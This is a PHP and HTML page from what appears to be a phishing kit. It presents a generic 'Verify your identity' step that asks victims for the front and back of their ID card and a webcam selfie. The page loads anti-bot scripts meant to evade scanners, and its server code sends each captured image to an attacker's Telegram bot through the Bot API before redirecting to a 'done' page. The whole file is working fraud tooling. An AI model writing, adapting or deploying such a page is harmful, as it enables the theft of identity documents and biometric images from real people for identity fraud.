<?php
require_once('./antibot/botfcker.php');
require_once('./antibot/botfcker2.php');
include 'config.php';

// Initialize variables
$uploaded = false;
$uploadErrors = [];
$sentToTelegram = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $allowedTypes = ['image/jpeg', 'image/png'];
    $files = ['idfrontcard', 'idbackcard', 'selfie'];
    $uploadedFiles = [];

    foreach ($files as $file) {
        if ($file === 'selfie') {
            if (isset($_FILES[$file]) && $_FILES[$file]['error'] == UPLOAD_ERR_OK) {
                // Handle file uploads for selfie
                $tmpName = $_FILES[$file]['tmp_name'];
                $name = basename($_FILES[$file]['name']);
                $targetFile = $uploadDir . $name;
                $fileType = mime_content_type($tmpName);

                // Validate file type
                if (in_array($fileType, $allowedTypes)) {
                    if (move_uploaded_file($tmpName, $targetFile)) {
                        $uploadedFiles[$file] = $targetFile;
                        $uploaded = true;
                    } else {
                        $uploadErrors[] = "Failed to upload $name.";
                    }
                } else {
                    $uploadErrors[] = "$name is not a valid image file. Only JPEG and PNG files are allowed.";
                }
            } elseif (isset($_POST[$file]) && !empty($_POST[$file])) {
                // Handle base64 encoded selfie data
                $data = $_POST[$file];
                $data = str_replace('data:image/jpeg;base64,', '', $data);
                $data = str_replace(' ', '+', $data);
                $fileData = base64_decode($data);

                // Check if base64 decode was successful
                if ($fileData === false) {
                    $uploadErrors[] = "Base64 decode failed for selfie.";
                } else {
                    $fileName = 'selfie.jpg'; // Set a filename for the selfie
                    $filePath = $uploadDir . $fileName;

                    if (file_put_contents($filePath, $fileData)) {
                        $uploadedFiles[$file] = $filePath;
                        $uploaded = true;
                    } else {
                        $uploadErrors[] = "Failed to save selfie.";
                    }
                }
            } else {
                $uploadErrors[] = "No selfie data received.";
            }
        } else {
            // Handle file uploads for ID front and back cards
            if (isset($_FILES[$file]) && $_FILES[$file]['error'] == UPLOAD_ERR_OK) {
                $tmpName = $_FILES[$file]['tmp_name'];
                $name = basename($_FILES[$file]['name']);
                $targetFile = $uploadDir . $name;
                $fileType = mime_content_type($tmpName);

                // Validate file type
                if (in_array($fileType, $allowedTypes)) {
                    if (move_uploaded_file($tmpName, $targetFile)) {
                        $uploadedFiles[$file] = $targetFile;
                        $uploaded = true;
                    } else {
                        $uploadErrors[] = "Failed to upload $name.";
                    }
                } else {
                    $uploadErrors[] = "$name is not a valid image file. Only JPEG and PNG files are allowed.";
                }
            } else {
                $uploadErrors[] = "No file uploaded or there was an error uploading the file.";
            }
        }
    }

    // Send files to Telegram
    if ($uploaded && empty($uploadErrors)) {
        foreach ($uploadedFiles as $filePath) {
            $telegramUrl = "https://api.telegram.org/bot$botToken/sendPhoto";
            $data = [
                'chat_id' => $chatId,
                'photo' => new CURLFile(realpath($filePath))
            ];

            // Initialize cURL
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegramUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

            // Execute cURL
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

            // Check for cURL errors
            if (curl_errno($ch)) {
                $uploadErrors[] = 'Failed to send data to Telegram: ' . curl_error($ch);
            } else if ($httpCode != 200) {
                $uploadErrors[] = 'Telegram API returned HTTP status code: ' . $httpCode;
            } else {
                // Check for Telegram API errors
                $responseData = json_decode($response, true);
                if (!$responseData['ok']) {
                    $uploadErrors[] = 'Telegram API returned an error: ' . $responseData['description'];
                } else {
                    $sentToTelegram = true;
                }
            }

            curl_close($ch);
        }
    }

    // Redirect if everything is successful
    if ($uploaded && empty($uploadErrors) && $sentToTelegram) {
        header("Location: done.php"); // Change this to your desired success page
        exit();
    }
}
?>






<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <title>Verify your identity</title>

    <style>
        :root {
            font-family: "Open Sans", sans-serif;
        }

        /* Hide video and buttons on smartphones */
        .smartphone {
            display: none;
        }

        .desktop-tablet {
            display: block;
        }

        /* Hide file input on desktops and tablets */
        @media only screen and (max-width: 768px) {
            .desktop-tablet {
                display: none;
            }

            .smartphone {
                display: block;
            }
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-[#404E57] p-2">
        <div class="p-1">
            <img class="w-20" src="./assets/Logo (1).svg" alt="Logo">
        </div>
    </nav>

    <!-- Split Background -->
    <div class="relative flex-grow min-h-[calc(100vh-4rem)]">
        <div class="absolute top-0 left-0 right-0 h-1/3 bg-[#2D3943]"></div>
        <div class="absolute bottom-0 left-0 right-0 h-1/2 bg-[#FFF]"></div>
        <div class="relative flex flex-col items-center justify-center">
            <div class="w-full max-w-6xl bg-white shadow-lg border border-gray-200 mt-36 mb-12 h-auto lg:h-screen rounded-lg">
                <div class="p-6 md:p-12">
                    <div class="p-4 md:p-8">
                        <div class="flex flex-col items-center justify-center">
                            <!-- Step Indicator -->
                            <div class="flex items-center space-x-4 md:space-x-6 mb-6">
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">1</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">2</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#008300] flex items-center justify-center bg-[#008300]">
                                    <span class="text-white">3</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">4</span>
                                </div>
                            </div>

                            <?php if (!empty($uploadErrors)): ?>
                                <div class="mt-4 text-red-500">
                                    <?php foreach ($uploadErrors as $error): ?>
                                        <p><?php echo htmlspecialchars($error); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            <?php endif; ?>

                            <h1 class="font-bold text-xl md:text-2xl mb-4 md:mb-6">
                                Verify your identity
                            </h1>

                            <div class="text-xs md:text-sm text-center p-2 md:p-3 mb-2">
                                <span>
                                    Please review and verify the information you’ve provided to ensure its accuracy.
                                    <br>This is essential before moving forward. Thank you.
                                </span>
                            </div>

                            <form id="identity-form" method="POST" enctype="multipart/form-data" class="w-full max-w-md md:max-w-lg mx-auto p-4 bg-white">
                                <span class="text-xs italic text-gray-500">Fields marked with an asterisk (*) are required.</span>

                                <!-- ID Front Card Upload -->
                                <div class="mb-4 relative">
                                    <label for="idfrontcard" class="block text-sm font-medium text-gray-700 mb-2">ID Front Card</label>
                                    <input type="file" id="idfrontcard" name="idfrontcard" accept=".png, .jpg, .jpeg" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2 pl-10" required>
                                    <i class="fas fa-id-card absolute inset-y-0 right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-500"></i>
                                </div>

                                <!-- ID Back Card Upload -->
                                <div class="mb-4 relative">
                                    <label for="idbackcard" class="block text-sm font-medium text-gray-700 mb-2">ID Back Card</label>
                                    <input type="file" id="idbackcard" name="idbackcard" accept=".png, .jpg, .jpeg" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2 pl-10" required>
                                    <i class="fas fa-id-card absolute inset-y-0 right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-500"></i>
                                </div>

                                <!-- Camera and Selfie Capture -->
                                <div class="mb-4 relative">
                                    <label for="selfie" class="block text-sm font-medium text-gray-700 mb-2">Selfie Verification</label>

                                    <!-- Video for desktop/tablet -->
                                    <div class="desktop-tablet">
                                        <video id="video" width="100%" height="auto" style="display: none;" autoplay></video>
                                        <canvas id="canvas" style="display: none;"></canvas>
                                        <button id="startCamera" type="button" class="mt-2 px-4 py-2 bg-[#0069AA] text-white rounded">Start Camera</button>
                                        <button id="capture" type="button" class="mt-2 px-4 py-2 bg-[#0069AA] text-white rounded" style="display: none;">Take Selfie</button>
                                    </div>

                                    <!-- File upload for smartphone -->
                                    <div class="smartphone">
                                        <input type="file" id="fileInput" name="selfie" accept="image/*" capture="environment" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2" required>
                                    </div>

                                    <input type="hidden" id="selfie" name="selfie" required>
                                    <p id="message" class="text-green-500 mt-2" style="display: none;">Photo successfully saved.</p>
                                    <i class="fas fa-camera absolute inset-y-0 right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-500"></i>
                                </div>




                                <div class="flex justify-center mt-24">
                                    <button type="submit" class="px-10 md:px-14 py-2 bg-[#0069AA] text-white border-b-4 border-[#005488] hover:bg-[#003a5e] hover:border-[#003a5e] font-bold focus:outline-none focus:ring-2 focus:ring-[#0069AA] focus:ring-opacity-50 rounded">
                                        Submit
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-[#2D3943] text-white text-center py-4 mt-auto">
        <p>&copy; 2024 Your Company. All rights reserved.</p>
        <div class="flex justify-center space-x-4 mt-2">
            <a href="#" class="hover:text-gray-400">Privacy Policy</a>
            <a href="#" class="hover:text-gray-400">Terms of Service</a>
            <a href="#" class="hover:text-gray-400">Contact Us</a>
        </div>
    </footer>
</body>




<script>
    document.addEventListener("DOMContentLoaded", () => {
        const startCameraButton = document.getElementById('startCamera');
        const captureButton = document.getElementById('capture');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const message = document.getElementById('message');
        const selfieInput = document.getElementById('selfie');
        let stream = null;

        // Start the camera
        startCameraButton.addEventListener('click', async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: true
                });
                video.srcObject = stream;
                video.style.display = 'block';
                startCameraButton.style.display = 'none';
                captureButton.style.display = 'block';
            } catch (error) {
                console.error('Error accessing the camera: ', error);
            }
        });

        // Capture the photo
        captureButton.addEventListener('click', () => {
            if (stream) {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg');

                // Save image data to hidden input
                selfieInput.value = imageData;

                // Stop the camera stream
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                captureButton.style.display = 'none';
                startCameraButton.style.display = 'block';
                message.style.display = 'block';
            }
        });
    });
</script>




</html>